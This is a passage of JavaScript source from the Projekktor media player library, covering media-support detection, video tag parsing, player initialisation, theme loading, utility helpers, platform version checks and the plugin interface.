	    } catch(e) { fileExt='NaN'; }

	    return extTypes[fileExt].type;

	};

	/* generates an array of mediatype=>playertype relations depending on browser capabilities */
	this._testMediaSupport = function() {

	    var result = {},
		streamType = '',
		ref = this;

	    for (var i=0; i < $p.mmap.length; i++ ) {

                platforms = (typeof $p.mmap[i]['platform']=='object') ? $p.mmap[i]['platform'] : [ $p.mmap[i]['platform'] ];
                
                $.each(platforms, function(_na, platform) {
		
                    if (platform==null)
                        return true;

                    streamType = $p.mmap[i]['streamType'] || ['http'];

                    $.each(streamType, function(key, st) {

                        if (result[st]==null)
                            result[st] = {};		
                        
                        if (result[st][platform]==null)
                            result[st][platform] = [];
                    
                        // avoid dupes
                        if ( $.inArray($p.mmap[i]['type'], result[st][platform] )>-1 )
                            return true;
                        
                        
                        var version = $p.models[ $p.mmap[i]['model'].toUpperCase() ].prototype[(platform.toLowerCase()) + 'Version'] || 1;
                            
                        // perform version and config check:
                        try {
                            if ( $p.platforms[platform.toUpperCase()]($p.mmap[i]['type']) >= version) {                                
                                // check if platform is enabled in config
                                if (ref.getConfig('enable'+platform.toUpperCase()+'Platform')!=false && $.inArray(platform, ref.getConfig('platforms'))>-1) {
                                    result[st][platform].push($p.mmap[i]['type'])                           
                                    // if ($p.mmap[i]['fixed']==true) return false;                                    
                                }
                                
                                return true;
                            }
                        } catch(e) {                            
                            $p.utils.log('ERROR', 'platform '+platform+' not defined')
                        }
                        
                        return true;
                    })
                    
                    return true;
                })
		
	    }

	    return result;
	};
        
	this._readMediaTag = function(domNode) {
	    var result = {},
		htmlTag='',
		attr=[],
		ref=this;

	    if("VIDEOAUDIO".indexOf(domNode[0].tagName.toUpperCase())==-1)
                return false;


	    // gather general config attributes:
	    // - Safari does not supply default-bools here:
	    if (!this.getConfig('ignoreAttributes')) {
		result = {
		    autoplay: ( (domNode.attr('autoplay')!==undefined || domNode.prop('autoplay')!==undefined) && domNode.prop('autoplay')!==false) ? true : false,
		    controls: ( (domNode.attr('controls')!==undefined || domNode.prop('controls')!==undefined) && domNode.prop('controls')!==false) ? true : false,
		    loop: ( (domNode.attr('autoplay')!==undefined || domNode.prop('loop')!==undefined) && domNode.prop('loop')!==false) ? true : false,
		    title: (domNode.attr('title')!==undefined && domNode.attr('title')!==false) ? domNode.attr('title') : '',
		    poster: (domNode.attr('poster')!==undefined && domNode.attr('poster')!==false) ? domNode.attr('poster') : '',
		    width: (domNode.attr('width')!==undefined && domNode.attr('width')!==false) ? domNode.attr('width') : null,
		    height: (domNode.attr('height')!==undefined && domNode.attr('height')!==false) ? domNode.attr('height') : null
		};
	    }
	    
	    // IE7+8 and some other idiots do not keep attributes w/o values:
            htmlTag = $($('<div></div>').html($(domNode).clone())).html();
            attr = ['autoplay', 'controls', 'loop'];
  
            for (var i=0; i<attr.length; i++) {
                if (htmlTag.indexOf(attr[i])==-1) continue;
                result[attr[i]] = true;
            }


	    // get possible media sources:
	    result.playlist = [];
	    result.playlist[0] = [];
	    result.playlist[0]['config'] = {tracks:[]};
	   
	    // ... from "src" attribute:
	    if (domNode.attr('src')) {
		result.playlist[0].push({
		    src: domNode.attr('src'),
		    type: domNode.attr('type') || this._getTypeFromFileExtension(domNode.attr('src'))
		});
	    }

	    // ... from media tagÂ´s children
	    // ... within a lame browser (IE <9) ...
	    if (!$('<video/>').get(0).canPlayType) {
		var childNode = domNode;
		do {
                                       
		    childNode = childNode.next('source,track');
		    if (childNode.attr('src')) {
			switch(childNode.get(0).tagName.toUpperCase()) {
			    case 'SOURCE':
				result.playlist[0].push({
				    src: childNode.attr('src'),
				    type: childNode.attr('type') || this._getTypeFromFileExtension(childNode.attr('src')),
                                    quality: childNode.attr('data-quality') || ''
				});				
				break;
			    case 'TRACK':
				if ($(this).attr('src')) {
				    result.playlist[0]['config']['tracks'].push({
					src: childNode.attr('src'),
					kind: childNode.attr('kind') || 'subtitle',
					lang: childNode.attr('srclang') || null,
					label: childNode.attr('label') || null
				    });
				}
				break;
			}
		    }
		} while (childNode.attr('src'))
	    }
    
	    // ... within a good browser ...
	    if (result.playlist[0].length==0) {
		domNode.children('source,track').each( function(){
		    if ($(this).attr('src')) {
			switch($(this).get(0).tagName.toUpperCase()) {
			    case 'SOURCE':
				result.playlist[0].push({
				    src: $(this).attr('src'),
				    type: $(this).attr('type') || ref._getTypeFromFileExtension($(this).attr('src')),
                                    quality: $(this).attr('data-quality') || ''
				});			    
				break;
			    case 'TRACK':
				result.playlist[0]['config']['tracks'].push({
				    src: $(this).attr('src'),
				    kind: $(this).attr('kind') || 'subtitle',
				    lang: $(this).attr('srclang') || null,
				    label: $(this).attr('label') || null
				});			    
				break;
			}
		    }
		});
	    }

	    return result;
	};        
        
	this._raiseError = function(txt) {
	    this.env.playerDom
		.html(txt)
		.css({
		    color: '#fdfdfd',
		    backgroundColor: '#333',
		    lineHeight: this.config.height+"px",
		    textAlign: 'center',
		    display: 'block'

		});
		this._promote('error');
	};

	this._init = function(customNode, customCfg) {

	    var theNode = customNode || srcNode,
		theCfg = customCfg || cfg,
		cfgByTag = this._readMediaTag(theNode);

	    // -----------------------------------------------------------------------------
	    // - 1. GENERAL CONFIG ---------------------------------------------------------
	    // -----------------------------------------------------------------------------

	    // remember original node HTML for reset and reference purposes:
	    this.env.srcNode = theNode.wrap('<div></div>').parent().html();
            theNode.unwrap();
            
	    // remember initial classes
	    this.env.className = theNode.attr('class') || '';
	    
            // remember ID
            this._id = theNode[0].id || $p.utils.randomId(8);            

	    if (cfgByTag!==false) {
		// swap videotag->playercontainer
		this.env.playerDom = $('<div/>')
		    .attr({
			'class': theNode[0].className,
			'style': theNode.attr('style')
		    })
		theNode.replaceWith( this.env.playerDom );
                
                // destroy theNode            
                theNode.empty().removeAttr('type').removeAttr('src');
                try {
                    theNode.get(0).pause();
                    theNode.get(0).load();
                } catch(e) {}
                
                $('<div/>').append(theNode).get(0).innerHTML='';
                theNode = null;
                
	    } else {
                this.env.playerDom = theNode;    
            }

	    // merge configs we got so far:
	    theCfg = $.extend(true, {}, cfgByTag, theCfg);
            
	    for (var i in theCfg) {
		if (this.config['_'+i]!=null) {
		    this.config['_'+i] = theCfg[i];
		} else {
                    if (i.indexOf('plugin_')>-1) this.config[i] = $.extend(this.config[i], theCfg[i]);
                    else this.config[i] = theCfg[i];
		}
	    }

            $p.utils.logging = this.config._debug;
            
            // initial DOM scaling
            this.setSize();
            
	    // force autoplay false on mobile devices:
	    if  (this.getIsMobileClient()) {
		this.config._autoplay = false;
		this.config.fixedVolume = true;
	    }


	    // -----------------------------------------------------------------------------
	    // - 2. TRIM DEST --------------------------------------------------------------
	    // -----------------------------------------------------------------------------

	    // make sure we can deal with a domID here:
	    this.env.playerDom.attr('id', this._id);

	    // ----------------------------------------------------------------------------
	    // - 3. INIT THEME LOADER ------------------------------------------------------
	    // -----------------------------------------------------------------------------
	    if (this.config._theme) {
		switch(typeof this.config._theme) {
		    case 'string':
			// later: this.getFromUrl(this.parseTemplate(this.config._themeRepo, {id:this.config._theme, ver:this.config._version}), this, "_applyTheme", false, 'jsonp');
			break;
		    case 'object':
			this._applyTheme(this.config._theme)
		}
	    }
	    else {
		this._start(false);
	    }

	    return this;
	};


	this._start = function(data) {

	    var ref = this,
                files=[];

	    // load and initialize pluginsÂ´
	    this._registerPlugins();


	    // set up iframe environment
	    if (this.config._iframe===true) {		
		if (this.getIframeWindow()) {
		    this.getIframeWindow().ready(function() {
			ref._enterFullViewport(true, false);
		    });
		} else {
		    ref._enterFullViewport(true, false);
		}
	    }

            // cross domain
            if (this.getIframeWindow()===false) {
                this.config._isCrossDomain = true;
            }
             
	    if (typeof onReady==='function') {
		this._enqueue(function() {onReady(ref);});
	    }

	    // playlist?
	    for (var i in this.config._playlist[0]) {
		// we prefer playlists - search one:
		if (this.config._playlist[0][i].type) {
		    if (this.config._playlist[0][i].type.indexOf('/json')>-1 || this.config._playlist[0][i].type.indexOf('/xml')>-1 ) {
			this.setFile(this.config._playlist[0][i].src, this.config._playlist[0][i].type);
			return this;
		    }
		}
	    }

	    this.setFile(this.config._playlist);

	    return this;
	};

	this._applyTheme = function(data) {

	    var ref = this;

	    // theme could not be loaded => error
	    if (data===false) {
		this._raiseError('The Projekktor theme-set specified could not be loaded.')
		return false;
	    }

	    /*
    	    // check projekktor version
	    if (typeof data. == 'string') {
		if (
		    (parseInt(this.config._version.split('.')[0]) || 0) < (parseInt(data.version.split('.')[0]) || 0) ||
		    (parseInt(this.config._version.split('.')[1]) || 0) < (parseInt(data.version.split('.')[1]) || 0)
		){
		    this._raiseError('You are using Projekktor V'+this.config._version+' but the applied theme requires at least V'+data.version+'.');
		    return false;
		}
	    }
	    */


	    // inject CSS & parse {relpath} tag (sprites)
	    if (typeof data.css == 'string') {
		$('head').append('<style type="text/css">' + $p.utils.parseTemplate(data.css, {'rp':data.baseURL}) + '</style>');
	    }

	    // apply html template
	    if (typeof data.html=='string') {
		this.env.playerDom.html( $p.utils.parseTemplate(data.html, {'p':this.getNS()}) );
	    }

	    // apply class            
	    this.env.playerDom.addClass(data.id).addClass(data.variation);
	    this.env.className = this.env.className && this.env.className.length !== 0 ? this.env.className + " " + data.id : data.id;
	    if(data.variation && data.variation.length !== 0) {
		this.env.className += " " + data.variation;
	    }	    

            // apply additional config
	    if (typeof data.config=='object') {
		for (var i in data.config) {

		    if (this.config['_'+i]!=null) {
			this.config['_'+i] = data.config[i];
		    } else {
                        if (i.indexOf('plugin_')>-1) this.config[i] = $.extend(true, {}, this.config[i], data.config[i]);
			else this.config[i] = data.config[i];
		    }
		}

		// check dependencies
		if (typeof data.config.plugins == 'object' ) {
		    for (var i=0; i<data.config.plugins.length; i++) {
			try {
			    typeof eval('projekktor'+data.config.plugins[i]);
			}
			catch(e) {
			    this._raiseError('The applied theme requires the following Projekktor plugin(s): <b>'+data.config.plugins.join(', ')+'</b>');
			    return false;
			}
		    }
		}
	    }

	    if (data.onReady) {
		this._enqueue(function(player){eval(data.onReady);});
	    }

	    return this._start();
	};


	return this._init();
    };

}

$p.mmap = [];
$p.models = {};
$p.newModel = function(obj, ext) {


    var result = false,
	extend = ($p.models[ext] && ext!=undefined) ? $p.models[ext].prototype : {};

    if (typeof obj!='object' ) return result;
    if (!obj.modelId) return result;
    if ($p.models[obj.modelId]) return result;

    /* register new model */
    $p.models[obj.modelId] = function(){};
    $p.models[obj.modelId].prototype = $.extend({}, extend, obj);

    /* add modelname to media map object */
    for (var i=0; i< obj.iLove.length; i++) {
	obj.iLove[i].model = obj.modelId.toLowerCase();
	$p.mmap.push( obj.iLove[i] );
    }
    return true;
}

});
var projekktorConfig = function(ver){this._version = ver;};
jQuery(function($) {	

	$p.utils = {
		
		imageDummy: function() {
                    return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABBJREFUeNpi/v//PwNAgAEACQsDAUdpTjcAAAAASUVORK5CYII=';
                },
                
		/**
		* Capitalizes a String
		* @private
		* @param (Object) da String
		* @return da result String
		*/                    
                capitalise: function(string)
                {
                    return string.charAt(0).toUpperCase() + string.slice(1).toLowerCase();
                },
                                
		/**
		* blocks text selection attempts by the user for the given obj
		* @private
		* @param (Object) Object 
		*/      
		blockSelection: function(dest) {
		    if (dest) 
                        dest
                            .css({
                                "-khtml-user-select": "none",
                                "-webkit-user-select": "none",
                                "MozUserSelect": "none",
                                "user-select": "none"
                            })
                            .attr('unselectable', 'on')
                            .bind("selectstart", function(){return false;})
                    return dest;
		},		
		
		unique: function (dest) {			
			var uniqueArr = [];
			for (var i = dest.length; i--; ) {
			    var val = dest[i];
			    if ($.inArray(val, uniqueArr) === -1) {
				uniqueArr.unshift(val);
			    }
			}
			return uniqueArr;
		},
		
		intersect: function(array1, array2) {

			var result = [];
			$.each(array1, function(i){
				// ugly try catch mess thx to IE6-8
				try {
					if ($.inArray(array2, array1[i])>-1) result.push(array1[i]);
				} catch(e) {}
				try {
					if ($.inArray(array1[i], array2)>-1) result.push(array1[i]);
				} catch(e) {}					
			})
			return result;
		},		
		
		roundNumber: function (rnum, rlength) {
		    if (rnum<=0 || isNaN(rnum) ) return 0;
		    return Math.round(rnum*Math.pow(10,rlength))/Math.pow(10,rlength);
		},		
		
		/* generates a random string of <length> */
		randomId: function(length) {			
		    var chars = "abcdefghiklmnopqrstuvwxyz", result = '';
		    for (var i=0; i<length; i++) {
			    var rnum = Math.floor(Math.random() * chars.length);
			    result += chars.substring(rnum,rnum+1);
		    }
		    return result;
		},
		
		toAbsoluteURL: function (s) {	    
			var l = location, h, p, f, i;
			
			if (s==null || s=='') return '';
			
			if (/^\w+:/.test(s)) {
			    return s;
			}
			
			h = l.protocol + '//' + l.host;
			if (s.indexOf('/') == 0) {
			    return h + s;
			}
			
			p = l.pathname.replace(/\/[^\/]*$/, '');
			f = s.match(/\.\.\//g);
			if (f) {
			    s = s.substring(f.length * 3);
			    for (i = f.length; i--;) {
				p = p.substring(0, p.lastIndexOf('/'));
			    }
			}
			
			return h + p + '/' + s;
		},
		
		/**
		* strips / trims
		* @public
		* @param (String) Da string to get processed
		* @return (String) Da trimmed string
		*/       
		strip: function(s) {
		    return s.replace(/^\s+|\s+$/g,"");
		},

    	
		/**
		* strips / trims
		* @public
		* @param (String) Da human readable time to parse
		* @return (Integer) Absolute seconds
		*/       
		toSeconds: function(t) {
                   
		    var s = 0.0
		    if (typeof t != 'string') return t;
		    if(t) {
		      var p = t.split(':');
                      if (p.length>3) 
                        p = p.slice(0,3);
                      
		      for(i=0;i<p.length;i++)
			s = s * 60 + parseFloat(p[i].replace(',', '.'))
		    }

		    return parseFloat(s);
		},
                
                toTimeString: function(secs, noSecs)
                {
                    var hours = Math.floor(secs / (60 * 60)),
                        divisor_for_minutes = secs % (60 * 60),
                        minutes = Math.floor(divisor_for_minutes / 60),                
                        divisor_for_seconds = divisor_for_minutes % 60,
                        seconds = Math.floor(divisor_for_seconds);
                
                    if (hours   < 10) {hours   = "0"+hours;}
                    if (minutes < 10) {minutes = "0"+minutes;}
                    if (seconds < 10) {seconds = "0"+seconds;}
                     
                    return (noSecs===true) ? hours+':'+minutes : hours+':'+minutes+':'+seconds;
                },
		
		/* X-Browser flash embedd mess */
		embeddFlash: function(destObj, domOptions, shield, shrinkShield){
		
		    var flashVars = domOptions.FlashVars || {},
			result = '',
			htmlEmbedObj = '',
			htmlEmbed = '',
			tmpStr = '',
			dest = destObj,
			id = '';
		    
		    // add flashVars
			if (domOptions.src.indexOf('?') == -1)
			   domOptions.src += "?";
			else
			   domOptions.src += "&";		    

		    
		    
		    for(var key in flashVars) {
			if(typeof flashVars[key] != 'function') {
			    tmpStr = flashVars[key];
			    
			    /*
			    // support "{tags}" to add media properties
			    for(var i in this.media) {
				if (typeof tmpStr != 'string') continue;	    
				tmpStr = tmpStr.replace('{'+i+'}', this.media[i]);
			    }
			    */
			    domOptions.src += key+'='+encodeURIComponent(tmpStr)+'&';
			}
		    }
		    domOptions.src.replace(/&$/, '');	
		    			    
		    // <object> bullshit with redundant "ID" IE extrawurst
		    htmlEmbedObj = '<object id="'+domOptions.id+'" codebase="https://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0"  name="'+domOptions.name+'" width="'+domOptions.width+'" height="'+domOptions.height+'" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000">'
		    + '<param name="movie" value="'+domOptions.src+'"></param>'
		    + '<param name="allowScriptAccess" value="'+domOptions.allowScriptAccess+'"></param>'
		    + '<param name="allowFullScreen" value="'+domOptions.allowFullScreen+'"></param>'
		    + '<param name="wmode" value="'+domOptions.wmode+'"></param>';
		    
		    
		    // <embed> tag
		    htmlEmbed = '<embed ';	    
		    for(var key in domOptions) {
			if (key.toUpperCase()==='FLASHVARS') continue;
			if(typeof domOptions[key] != 'function') htmlEmbed += key+'="'+domOptions[key]+'" ';
		    }	    
		    htmlEmbed += ' pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash"></embed>';	
		    
		    
		    result = htmlEmbedObj + htmlEmbed; 
		    result += '</object>';
		    
		    if (!document.all || window.opera) {
			result = htmlEmbed;
		    }

		    if (dest===null)
			return result;
		    
		    // jquerx 1.4.2 IE flash <object> issue workaround:
		    // this doesn´t work in IE: destObj.append(result);
		    dest.get(0).innerHTML = result;

                    if(shield!==false) {
                        dest.append(
                            $('<div/>').attr('id', domOptions.id+'_cc' )
                            .css({
                                width: (shrinkShield) ? '1px' :  '100%',
                                height: (shrinkShield) ? '1px' :  '100%',
                                backgroundColor: ($p.utils.ieVersion() < 9) ? '#000' : 'transparent',
                                filter: 'alpha(opacity = 0.1)',
                                position: 'absolute',
                                top: 0,
                                left: 0
                            })
                        )
                    }
                    
		    return $('#'+domOptions.id)[0];
		},
		
                ieVersion: function(){
                    var v = 3,
                        div = document.createElement('div'),
                        all = div.getElementsByTagName('i');
    
                    while (
                        div.innerHTML = '<!--[if gt IE ' + (++v) + ']><i></i><![endif]-->',
                        all[0]
                    );

                    return v > 4 ? v : undefined;
                },
    
		/**
		* replaces {}-tags with parameter´s equialents
		* @public
		* @param (String) Da string to get processed
		* @param (Object) Object holding data to fill in
		* @return (String) Da parsed string
		*/      
		parseTemplate: function(template, data, encode) {
	
		    if (data===undefined || data.length==0 || typeof data != 'object') return template;
	
		    for(var i in data) {
			template = template.replace(new RegExp('%{'+i+'}', 'gi'), ((encode===true) ? window.encodeURIComponent(data[i]) : data[i]))
		    }
		    template = template.replace(/%{(.*?)}/gi, '');
		    return template;
		},
		
		
		/**
		 * stretches target to fit into specified dimensions keeping apsect ratio
		 * @public
		 * @param (String) "fill" or "aspectratio" (default)
		 * @param (Object) the Dom-Obj to scale
		 * @param (Float) The maximum available width in px 
		 * @param (Float) The maximum available height in px
		 * @param (Float) A forced asumed with of the target object (optional)
		 * @param (Float) A forced asumed height of the target object (optional)
		 * @return (Boolean) Returns TRUE if <target> was resized in any way, otherwise FALSE
		 */          
		 stretch: function (stretchStyle, target, wid, hei, twf, thf) {
			if (target==null)
                            return false;
                       
                        if ( (target instanceof $)==false )
                            target = $(target)                         

			if (!target.data('od')) {
			    target.data('od', {width:target.width() , height:target.height()} );
			}

                        var tw = (twf!==undefined) ? twf : target.data('od').width,
                            th = (thf!==undefined) ? thf : target.data('od').height,
                            xsc = (wid/tw),
                            ysc = (hei/th),
                            rw = wid,
                            rh = hei;
         
                        // fill area
                        switch (stretchStyle) {
                                case 'none':
                                        rw = tw;
                                        rh = th;
                                break;
                                
                                case 'fill':
                                if(xsc > ysc) {
                                        rw = tw*xsc;
                                        rh = th*xsc;
                                } else if(xsc < ysc) {
                                        rw = tw*ysc;
                                        rh = th*ysc;	    
                                }
                                break;
                                
                                case 'aspectratio':
                                default:
                                // scale, keep aspect ratio
                                if(xsc > ysc) {
                                        rw = tw*ysc;
                                        rh = th*ysc;
                                } else if(xsc < ysc) {
                                        rw = tw*xsc;
                                        rh = th*xsc;	    
                                }
                                break;
                        }
                        wid = $p.utils.roundNumber((rw/wid)*100,0)+2;
                        hei = $p.utils.roundNumber((rh/hei)*100,0)+2;

                        if (wid==0 || hei==0)
                                return false;
                
                        target.css({
                                'margin': 0,
                                'padding': 0,
                                'width': wid+"%",
                                'height': hei+"%",
                                'left': (100-wid)/2+"%",
                                'top': (100-hei)/2+"%"
                        });

                        if (target.data('od').width != target.width() || target.data('od').height != target.height() ) {
                                return true;
                        }

			return false;
		
		 },
                 
                // parseUri 1.2.2
                // (c) Steven Levithan <stevenlevithan.com>
                // MIT License                 
                parseUri: function (str) {
                        var	o  = {
                                strictMode: false,
                                key: ["source","protocol","authority","userInfo","user","password","host","port","relative","path","directory","file","query","anchor"],
                                q:   {
                                        name:   "queryKey",
                                        parser: /(?:^|&)([^&=]*)=?([^&]*)/g
                                },
                                parser: {
                                        strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
                                        loose:  /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
                                }
                                },
                                m   = o.parser[o.strictMode ? "strict" : "loose"].exec(str),
                                uri = {},
                                i   = 14;
                
                        while (i--) uri[o.key[i]] = m[i] || "";
                
                        uri[o.q.name] = {};
                        uri[o.key[12]].replace(o.q.parser, function ($0, $1, $2) {
                                if ($1) uri[o.q.name][$1] = $2;
                        });
                
                        return uri;
                },
                
                // usage: log('inside coolFunc',this,arguments);
                // http://paulirish.com/2009/log-a-lightweight-wrapper-for-consolelog/                
                log: function() {                    

                    if (this.logging==false)
                        return;
                    
                    this.history = this.history || [];   // store logs to an array for reference
                    this.history.push(arguments);
                    if(window.console)
                        console.log( Array.prototype.slice.call(arguments) );                
                },
                
                cleanResponse: function (responseText, type) {
                    var data = false;

                    switch (type) {
                            case 'html':
                            case 'xml':
                                // Create the xml document from the responseText string.
                                if( window.DOMParser ) {
                                    data = new DOMParser()
                                    data = data.parseFromString( responseText,"text/xml" ) ;
                                }
                                else { // Internet Explorer
                                    data=new ActiveXObject( "Microsoft.XMLDOM" ) ;
                                    data.async = "false" ;
                                    data.loadXML( responseText ) ;
                                }
                                break;
    
                            case 'json':
                                data = responseText;
                                if (typeof data == 'string') {
                                    data = $.parseJSON(data);
                                }
                                break;
                            case 'jsonp':
                                break;
                            default:
                                data = responseText;
                                break;
    
                    }
                    return data;
                },
                
                cssTransitions: function() {
                    var m = document.createElement('z'),
                        s = m.style;
                    function test_props( p ) {                        
                            for ( var i in p ) {
                                    if ( s[ p[i] ]!=null ) {
                                            return true;
                                    }
                            }
                            return false;
                    }                    
                    function test_props_all( prop ) {
                            var d = 'Webkit Moz O ms Khtml'.split(' '),
                                u = prop.charAt(0).toUpperCase() + prop.substr(1),
                                e = (prop + ' ' + d.join(u + ' ') + u).split(' ');
                            return test_props( e );
                    }
                    return test_props_all( 'animationName' );
                },
                
                logging: false
                 
		
	}
});


jQuery(function($) {	

    $p.platforms = {

        /*
	VLC: function() {
                        return 3;
            console.log("VLC", navigator.plugins)
	    try {
		return navigator.plugins['VLC Multimedia Plug-in'].version.match(/^,?(.+),?$/)[1].match(/\d+/g)[0]
	    } catch(e) {}
	    return '0,0,0'.match(/\d+/g)[0];
	},
        */
        
	/* returns the version of the flash player installed for user´s browser. returns 0 on none. */
	FLASH: function(typ) {
	    try {
		try {
		    // avoid fp6 minor version lookup issues
		    // see: http://blog.deconcept.com/2006/01/11/getvariable-setvariable-crash-internet-explorer-flash-6/
		    var axo = new ActiveXObject('ShockwaveFlash.ShockwaveFlash.6');
		    try { axo.AllowScriptAccess = 'always';	}
		    catch(e) { return '6,0,0'; }
		} catch(e) {}
		return new ActiveXObject('ShockwaveFlash.ShockwaveFlash').GetVariable('$version').replace(/\D+/g, ',').match(/^,?(.+),?$/)[1].match(/\d+/g)[0];
	    } catch(e) {
		try {
		    if(navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin){
			return (navigator.plugins["Shockwave Flash 2.0"] || navigator.plugins["Shockwave Flash"]).description.replace(/\D+/g, ",").match(/^,?(.+),?$/)[1].match(/\d+/g)[0];
		    }
		} catch(e) {}
	    }
	    return 0;
	},
        
        ANDROID: function(type) {
            try {return parseInt(  navigator.userAgent.toLowerCase().match(/android\s+(([\d\.]+))?/)[1] );} catch(e) {return 0;}
        },
        
        IOS: function(type) {
            var agent = navigator.userAgent.toLowerCase(),
                start = agent.indexOf( 'os ' );
            if( ( agent.indexOf( 'iphone' ) > -1 || agent.indexOf( 'ipad' ) > -1 ) && start > -1 ){
                return parseInt( agent.substr( start + 3, 3 ).replace( '_', '.' ) );
            } 
            return 0;
        },
	
	NATIVE: function(type) {
	    try {
		var testObject = document.createElement( (type.indexOf('video')>-1) ? 'video' : 'audio' );
		if (testObject.canPlayType!=null) {
                    if (type=='*')
                        return 1;
                    
		    switch ( testObject.canPlayType(type) ) {
			case "no":
			case "":
                            return 0; 
			// case "maybe":			
			// case "probably":
			default:
			    return 1;                                            
		    }
		}
	    } catch (e) {
		return 0;
	    }
	},
	
	BROWSER: function(type){
	    return 1;  
        }
    }
});    
/*
 * this file is part of: 
 * projekktor zwei
 * 
 *
 * Copyright 2010, 2011, 2012 Sascha Kluger, Spinning Airwhale Media, http://www.spinningairwhale.com
 * under GNU General Public License
 * http://www.filenew.org/projekktor/license/
*/
var projekktorPluginInterface = function(){};
jQuery(function($) {
projekktorPluginInterface.prototype = {
    
    pluginReady: false,
    reqVer: null,
    name: '',
    pp: {},
    config: {},
    playerDom: null,
    canvas: {
        media: null,
        projekktor: null
    },
    
    _appliedDOMObj: [],
    _pageDOMContainer: {},
    _childDOMContainer: {},
    
    _init: function(pluginConfig) {        
	this.config = $.extend(true, this.config, pluginConfig);
	if (this.reqVer!=null) {
            var plv = this.pp.getPlayerVer().split('.'),
                pv = this.reqVer.split('.');
                
	    if ( plv[0] * 10000 + plv[1]*1000 + plv[2]*10 < pv[0] * 10000 + pv[1]*1000 + pv[2]*10 ) {
		alert("Plugin '" + this.name + "' requires Projekktor v" + this.reqVer + " or later! Please visit  and get the most recent version.");
		this.pluginReary = true;
		return;
	    }
	}
	this.initialize();
    },
    
    getConfig: function(idx, defaultValue) {	
	var result = null,
            def = defaultValue || null;

	if (this.pp.getConfig('plugin_'+this.name)!=null) {
	    result = this.pp.getConfig('plugin_'+this.name)[idx];
	}

	if (result==null) {
	    result = this.pp.getConfig(idx);
	}
	        
	if (result==null) {
	    result = this.config[idx];
	}

	if (typeof result == 'object' && result.length === null)
	    result = $.extend(true, {}, result, this.config[idx]);
        else if (typeof result == 'object') {
	    result = $.extend(true, [], this.config[idx] || [], result || [] );
        }
        
	return (result==null) ? def : result;
    },
    
    getDA: function(name) {
        return 'data-' + this.pp.getNS() + '-' + this.name + '-' + name;        
    },
    
    getCN: function(name) {
        return this.pp.getNS() + name;        
    },    
    
    sendEvent: function(eventName, data) {
	this.pp._promote({_plugin:this.name, _event:eventName}, data);
    },

    deconstruct: function() {
	this.pluginReady = false;
	$.each(this._appliedDOMObj, function() {
	    $(this).unbind(); 
	});
    },
    
    /**
    * applies a new dom element to the player in case it´s not yet present
    * also transparently applies the cssclass prefix as configured
    * 
    * @private
    * @element (Object) the element
    * @fu (String) function, default 'container'
    * @visible (Boolean) display on init, default is 'false'
    * @return (Object) the element
    */
    applyToPlayer: function(element, fu, visible) {
        if (!element) return null;

        var func = fu || 'container',
            tmpClass = '',
            ref = this;
        
        try {tmpClass = element.attr("class") ||  this.name} catch(e){tmpClass = this.name;}

        this._pageDOMContainer[func] = $( "["+this.getDA('host')+"='" + this.pp.getId() + "']["+this.getDA('func')+"='"+func+"']" );
        this._childDOMContainer[func] = this.playerDom.find("[" + this.getDA('func') + "='" + func + "'],." + this.getCN(tmpClass) + ":not([" +this.getDA('func') +"=''])");

        // check if this element aleady exists somewhere on page        
        if ( this._pageDOMContainer[func].length > 0 ) {
            this._pageDOMContainer[func].removeClass('active').addClass('inactive');
            
            $.each(this._pageDOMContainer[func], function() {
                ref._appliedDOMObj.push($(this));
            });
            
            return this._pageDOMContainer[func];
        }
 
        // add new DOM container to the player	
        if (this._childDOMContainer[func].length==0) {
            element
                .removeClass(tmpClass)
                .addClass(this.pp.getNS()+tmpClass)
                .removeClass('active')
                .addClass('inactive')
                .attr(this.getDA('func'), func)
                .appendTo(this.playerDom);
                
            this._childDOMContainer[func] = element;
            this._appliedDOMObj.push(element);
            if (visible===true) {
                element.addClass('active').removeClass('inactive');
            }

	    return element;
	} else {
            
            $.each(this._childDOMContainer[func], function() {
                $(this).attr(ref.getDA('func'), func)
                ref._appliedDOMObj.push($(this));
            });
        }
        
        if (visible===true) {
            this._childDOMContainer[func].addClass('active').removeClass('inactive');
        }

	return $(this._childDOMContainer[func][0]);
    },

    getElement: function(name) {
	return this.pp.env.playerDom.find('.' + this.pp.getNS() + name)
    },

    setInactive: function() {
        $(this._pageDOMContainer['container']).removeClass('active').addClass('inactive');
        $(this._childDOMContainer['container']).removeClass('active').addClass('inactive');
	this.sendEvent('inactive', $.extend(true, {}, this._pageDOMContainer['container'], this._childDOMContainer['container']));
    },
    
    setActive: function(elm, on) {
        if (elm==null) {
            this._pageDOMContainer['container'].removeClass('inactive').addClass('active');
            this._childDOMContainer['container'].removeClass('inactive').addClass('active');
	    this.sendEvent('active', $.extend(true, {}, this._pageDOMContainer['container'], this._childDOMContainer['container']));
            return;
        }

        var dest = (typeof elm =='object') ? elm : this.getElement(elm);
	if (on!=false) dest.addClass('active').removeClass('inactive');
	else dest.addClass('inactive').removeClass('active');
        dest.css('display', '');
        return dest;
    },
    
    getActive: function(elm) {        
        return $(elm).hasClass('active');
    },    
    
    // triggered on plugin-instanciation 
    initialize: function() {},
    
    isReady: function() {
	return this.pluginReady;
    },
    
    clickHandler: function(what) {
	try {
	    this.pp[this.getConfig(what+'Click').callback](this.getConfig(what+'Click').value);
	} catch(e){
	    try {
                this.getConfig(what+'Click')(this.getConfig(what+'Click').value);
            } catch(e){}
	}
	return false;    
    },
    
    cookie: function (key, value, del) {
	// iphone will fail if you try to set a cookie this way:
	if (document.cookie===undefined || document.cookie===false) return null;
	if (key==null) return null;
	
	// set cookie:
	if (arguments.length > 1 && value!=null) {
	    var t = new Date();
